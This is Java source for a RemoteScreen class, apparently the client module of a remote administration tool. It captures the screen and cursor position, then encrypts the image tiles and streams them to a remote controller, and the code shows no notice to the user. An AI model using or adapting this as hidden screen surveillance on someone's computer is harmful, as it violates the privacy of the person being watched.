package com.redpois0n;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;

import com.redpois0n.common.compress.GZip;
import com.redpois0n.common.crypto.Crypto;
import com.redpois0n.packets.in.PacketBuilder;
import com.redpois0n.packets.out.Header;
import com.redpois0n.utils.ImageUtils;

public class RemoteScreen {

	public static int[] prevSums = new int[0];
	public static int prevX;
	public static int prevY;
	
	public void clearCache() {
		prevSums = new int[0];
		prevX = 0;
		prevY = 0;
	}

	public static int calculateSum(BufferedImage image) {
		int[] pixels = image.getRaster().getPixels(0, 0, image.getWidth(), image.getHeight(), new int[image.getWidth() * image.getHeight() * 3]);
		int sum = 0;
		for(int x = 0; x < image.getWidth(); x += 16) {
			for (int y = 0; y < image.getHeight(); y += 16) {
				sum += pixels[(y * image.getWidth() + x) * 3 + 0];
				sum += pixels[(y * image.getWidth() + x) * 3 + 1];
				sum += pixels[(y * image.getWidth() + x) * 3 + 2];
			}
		}
		return sum;
	}
	
	public static void send(boolean once, int quality, int monitor, int ROWS, int COLS) {
		try {	
			if (prevSums.length != ROWS * COLS) {
				prevSums = new int[ROWS * COLS];
			}	
			float q = Float.parseFloat(quality + "") / 10F;	
			
			PacketBuilder packet = new PacketBuilder(once ? Header.SINGLE_IMAGE_COMING : Header.IMAGE_COMING);
			BufferedImage image = null;
			Rectangle screenBounds = null;
			
			if (monitor == -1) {
				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				image = new Robot().createScreenCapture(screenBounds);
			} else {
				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
				Robot robotForScreen = new Robot(screen);  		
				screenBounds = screen.getDefaultConfiguration().getBounds();  
				screenBounds.x = 0;
				screenBounds.y = 0;
				image = robotForScreen.createScreenCapture(screenBounds);
			}
			
			packet.add(screenBounds.width);
			packet.add(screenBounds.height);
			
			Point point = MouseInfo.getPointerInfo().getLocation();
			
			packet.add(point.x);
			packet.add(point.y);
			
			Connection.addToSendQueue(packet);
						
			Connection.lock();
			
	        int chunks = ROWS * COLS;  
	        int chunkWidth = image.getWidth() / COLS; 
	        int chunkHeight = image.getHeight() / ROWS;  
	        int count = 0;  
	        int cou = 0;
	        
	        BufferedImage imgs[] = new BufferedImage[chunks];
        
	        for (int x = 0; x < ROWS; x++) {  
	            for (int y = 0; y < COLS; y++) {  
	            	BufferedImage i;
	                imgs[count] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());  
	                Graphics2D gr = imgs[count++].createGraphics();  
	                gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);  
	                gr.dispose();  
	                
	                byte[] buffer = ImageUtils.encodeImage(i, q);
	                buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
	                
	                boolean doit = false;
	                
	                int sum = calculateSum(i);        
	            	if (sum != prevSums[cou] || prevX >= chunkWidth * y && prevX <= chunkWidth * y + chunkWidth && prevY >= chunkHeight * x && prevY <= chunkHeight * x + chunkHeight
	            			&& point.x <= chunkWidth * y && point.x >= chunkWidth * y + chunkWidth && point.y <= chunkHeight * x && point.y >= chunkHeight * 5 + chunkHeight) {
	            		doit = true; 
		            	prevSums[cou] = sum;
		            	
	            	}
	            	
	            	cou++;
	               
	                if (doit) {
	                	Connection.writeBoolean(true);
			            Connection.writeInt(buffer.length);
			            Connection.dos.write(buffer);		    			         
	                } else {
	                	Connection.writeBoolean(false);  
	                }
	            }  
	        }  
	        
	        for (int i = 0; i < imgs.length; i++) {
	        	imgs[i] = null;
	        }
			
			image.flush();
			
			prevX = point.x;
			prevY = point.y;
			
			System.gc();
			
			Connection.lock();

		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static void sendThumbnail() {
		try {
			Connection.write(Header.THUMBNAIL);
			System.gc();
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());	
			BufferedImage screenShot = Main.robot.createScreenCapture(screenRect);
			screenShot = resize(screenShot, 150, 100);
			BufferedImage bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
			bufferedImage.getGraphics().drawImage(screenShot, 0, 0, null);
			byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();
			Connection.dos.write(buffer);
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static BufferedImage resize(BufferedImage image, int w, int h) {
		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_3BYTE_BGR);
		Graphics2D gr = img.createGraphics();
		gr.drawImage(image.getScaledInstance(w, h, BufferedImage.SCALE_SMOOTH), 0, 0, w, h, null);
		gr.dispose();
		return img;
	}

}
